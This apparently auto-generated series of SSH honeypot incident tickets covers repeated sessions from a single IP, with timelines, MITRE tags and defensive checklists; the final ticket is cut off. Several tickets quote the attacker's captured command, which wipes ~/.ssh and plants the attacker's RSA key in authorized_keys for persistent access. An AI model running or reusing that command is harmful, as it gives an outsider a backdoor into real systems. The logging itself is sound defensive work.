### 🔴 HIGH · IR-e0848175d04a

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:39 |
| **Last Seen** | 2026-05-10 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:39:17` | `cowrie.session.connect` |
| `2026-05-10 11:39:17` | `cowrie.client.version` |
| `2026-05-10 11:39:17` | `cowrie.client.kex` |
| `2026-05-10 11:39:18` | `cowrie.login.success` |
| `2026-05-10 11:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2904afcdb1a0

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:40 |
| **Last Seen** | 2026-05-10 11:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:40:00` | `cowrie.session.connect` |
| `2026-05-10 11:40:00` | `cowrie.client.version` |
| `2026-05-10 11:40:00` | `cowrie.client.kex` |
| `2026-05-10 11:40:01` | `cowrie.login.success` |
| `2026-05-10 11:40:02` | `cowrie.session.params` |
| `2026-05-10 11:40:02` | `cowrie.command.input` |
| `2026-05-10 11:40:02` | `cowrie.command.failed` |
| `2026-05-10 11:40:02` | `cowrie.log.closed` |
| `2026-05-10 11:40:03` | `cowrie.session.params` |
| `2026-05-10 11:40:03` | `cowrie.command.input` |
| `2026-05-10 11:40:03` | `cowrie.session.file_download` |
| `2026-05-10 11:40:03` | `cowrie.log.closed` |
| `2026-05-10 11:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014329c72b07

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:40 |
| **Last Seen** | 2026-05-10 11:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:40:07` | `cowrie.session.connect` |
| `2026-05-10 11:40:07` | `cowrie.client.version` |
| `2026-05-10 11:40:08` | `cowrie.client.kex` |
| `2026-05-10 11:40:09` | `cowrie.login.success` |
| `2026-05-10 11:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8e809c88db8

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:41 |
| **Last Seen** | 2026-05-10 11:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:41:43` | `cowrie.session.connect` |
| `2026-05-10 11:41:43` | `cowrie.client.version` |
| `2026-05-10 11:41:43` | `cowrie.client.kex` |
| `2026-05-10 11:41:45` | `cowrie.login.success` |
| `2026-05-10 11:41:45` | `cowrie.session.params` |
| `2026-05-10 11:41:45` | `cowrie.command.input` |
| `2026-05-10 11:41:45` | `cowrie.command.failed` |
| `2026-05-10 11:41:46` | `cowrie.log.closed` |
| `2026-05-10 11:41:46` | `cowrie.session.params` |
| `2026-05-10 11:41:46` | `cowrie.command.input` |
| `2026-05-10 11:41:47` | `cowrie.session.file_download` |
| `2026-05-10 11:41:47` | `cowrie.log.closed` |
| `2026-05-10 11:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3bdfd40470e

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:41 |
| **Last Seen** | 2026-05-10 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:41:50` | `cowrie.session.connect` |
| `2026-05-10 11:41:50` | `cowrie.client.version` |
| `2026-05-10 11:41:50` | `cowrie.client.kex` |
| `2026-05-10 11:41:51` | `cowrie.login.success` |
| `2026-05-10 11:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa5858f93f7

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:42 |
| **Last Seen** | 2026-05-10 11:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:42:33` | `cowrie.session.connect` |
| `2026-05-10 11:42:33` | `cowrie.client.version` |
| `2026-05-10 11:42:33` | `cowrie.client.kex` |
| `2026-05-10 11:42:35` | `cowrie.login.success` |
| `2026-05-10 11:42:35` | `cowrie.session.params` |
| `2026-05-10 11:42:35` | `cowrie.command.input` |
| `2026-05-10 11:42:35` | `cowrie.command.failed` |
| `2026-05-10 11:42:36` | `cowrie.log.closed` |
| `2026-05-10 11:42:36` | `cowrie.session.params` |
| `2026-05-10 11:42:36` | `cowrie.command.input` |
| `2026-05-10 11:42:37` | `cowrie.session.file_download` |
| `2026-05-10 11:42:37` | `cowrie.log.closed` |
| `2026-05-10 11:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93957d42fda7

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:42 |
| **Last Seen** | 2026-05-10 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:42:40` | `cowrie.session.connect` |
| `2026-05-10 11:42:40` | `cowrie.client.version` |
| `2026-05-10 11:42:40` | `cowrie.client.kex` |
| `2026-05-10 11:42:42` | `cowrie.login.success` |
| `2026-05-10 11:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb7d073d20fa

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:43 |
| **Last Seen** | 2026-05-10 11:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:43:23` | `cowrie.session.connect` |
| `2026-05-10 11:43:23` | `cowrie.client.version` |
| `2026-05-10 11:43:24` | `cowrie.client.kex` |
| `2026-05-10 11:43:25` | `cowrie.login.success` |
| `2026-05-10 11:43:25` | `cowrie.session.params` |
| `2026-05-10 11:43:25` | `cowrie.command.input` |
| `2026-05-10 11:43:25` | `cowrie.command.failed` |
| `2026-05-10 11:43:26` | `cowrie.log.closed` |
| `2026-05-10 11:43:26` | `cowrie.session.params` |
| `2026-05-10 11:43:26` | `cowrie.command.input` |
| `2026-05-10 11:43:27` | `cowrie.session.file_download` |
| `2026-05-10 11:43:27` | `cowrie.log.closed` |
| `2026-05-10 11:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4668e9a3dd4

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:43 |
| **Last Seen** | 2026-05-10 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:43:30` | `cowrie.session.connect` |
| `2026-05-10 11:43:30` | `cowrie.client.version` |
| `2026-05-10 11:43:30` | `cowrie.client.kex` |
| `2026-05-10 11:43:31` | `cowrie.login.success` |
| `2026-05-10 11:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e950ce7a07a4

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:44 |
| **Last Seen** | 2026-05-10 11:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:44:15` | `cowrie.session.connect` |
| `2026-05-10 11:44:15` | `cowrie.client.version` |
| `2026-05-10 11:44:15` | `cowrie.client.kex` |
| `2026-05-10 11:44:16` | `cowrie.login.success` |
| `2026-05-10 11:44:17` | `cowrie.session.params` |
| `2026-05-10 11:44:17` | `cowrie.command.input` |
| `2026-05-10 11:44:17` | `cowrie.command.failed` |
| `2026-05-10 11:44:17` | `cowrie.log.closed` |
| `2026-05-10 11:44:18` | `cowrie.session.params` |
| `2026-05-10 11:44:18` | `cowrie.command.input` |
| `2026-05-10 11:44:18` | `cowrie.session.file_download` |
| `2026-05-10 11:44:18` | `cowrie.log.closed` |
| `2026-05-10 11:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a95e325b53

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:44 |
| **Last Seen** | 2026-05-10 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:44:22` | `cowrie.session.connect` |
| `2026-05-10 11:44:22` | `cowrie.client.version` |
| `2026-05-10 11:44:22` | `cowrie.client.kex` |
| `2026-05-10 11:44:23` | `cowrie.login.success` |
| `2026-05-10 11:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba049daa1337

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:45 |
| **Last Seen** | 2026-05-10 11:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:45:05` | `cowrie.session.connect` |
| `2026-05-10 11:45:05` | `cowrie.client.version` |
| `2026-05-10 11:45:05` | `cowrie.client.kex` |
| `2026-05-10 11:45:07` | `cowrie.login.success` |
| `2026-05-10 11:45:07` | `cowrie.session.params` |
| `2026-05-10 11:45:07` | `cowrie.command.input` |
| `2026-05-10 11:45:07` | `cowrie.command.failed` |
| `2026-05-10 11:45:08` | `cowrie.log.closed` |
| `2026-05-10 11:45:08` | `cowrie.session.params` |
| `2026-05-10 11:45:08` | `cowrie.command.input` |
| `2026-05-10 11:45:09` | `cowrie.session.file_download` |
| `2026-05-10 11:45:09` | `cowrie.log.closed` |
| `2026-05-10 11:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f388877266c

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:45 |
| **Last Seen** | 2026-05-10 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:45:12` | `cowrie.session.connect` |
| `2026-05-10 11:45:12` | `cowrie.client.version` |
| `2026-05-10 11:45:12` | `cowrie.client.kex` |
| `2026-05-10 11:45:14` | `cowrie.login.success` |
| `2026-05-10 11:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4fc4ea18ec6

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:45 |
| **Last Seen** | 2026-05-10 11:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:45:57` | `cowrie.session.connect` |
| `2026-05-10 11:45:57` | `cowrie.client.version` |
| `2026-05-10 11:45:58` | `cowrie.client.kex` |
| `2026-05-10 11:45:59` | `cowrie.login.success` |
| `2026-05-10 11:46:00` | `cowrie.session.params` |
| `2026-05-10 11:46:00` | `cowrie.command.input` |
| `2026-05-10 11:46:00` | `cowrie.command.failed` |
| `2026-05-10 11:46:00` | `cowrie.log.closed` |
| `2026-05-10 11:46:01` | `cowrie.session.params` |
| `2026-05-10 11:46:01` | `cowrie.command.input` |
| `2026-05-10 11:46:01` | `cowrie.session.file_download` |
| `2026-05-10 11:46:01` | `cowrie.log.closed` |
| `2026-05-10 11:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7456552cf19

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:46 |
| **Last Seen** | 2026-05-10 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:46:04` | `cowrie.session.connect` |
| `2026-05-10 11:46:04` | `cowrie.client.version` |
| `2026-05-10 11:46:04` | `cowrie.client.kex` |
| `2026-05-10 11:46:06` | `cowrie.login.success` |
| `2026-05-10 11:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cbe7f673511

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:47 |
| **Last Seen** | 2026-05-10 11:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:47:47` | `cowrie.session.connect` |
| `2026-05-10 11:47:47` | `cowrie.client.version` |
| `2026-05-10 11:47:47` | `cowrie.client.kex` |
| `2026-05-10 11:47:48` | `cowrie.login.success` |
| `2026-05-10 11:47:49` | `cowrie.session.params` |
| `2026-05-10 11:47:49` | `cowrie.command.input` |
| `2026-05-10 11:47:49` | `cowrie.command.failed` |
| `2026-05-10 11:47:49` | `cowrie.log.closed` |
| `2026-05-10 11:47:50` | `cowrie.session.params` |
| `2026-05-10 11:47:50` | `cowrie.command.input` |
| `2026-05-10 11:47:50` | `cowrie.session.file_download` |
| `2026-05-10 11:47:50` | `cowrie.log.closed` |
| `2026-05-10 11:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ddcc3999e38

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:47 |
| **Last Seen** | 2026-05-10 11:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:47:54` | `cowrie.session.connect` |
| `2026-05-10 11:47:54` | `cowrie.client.version` |
| `2026-05-10 11:47:54` | `cowrie.client.kex` |
| `2026-05-10 11:47:55` | `cowrie.login.success` |
| `2026-05-10 11:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53083e4a9e26

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:50 |
| **Last Seen** | 2026-05-10 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
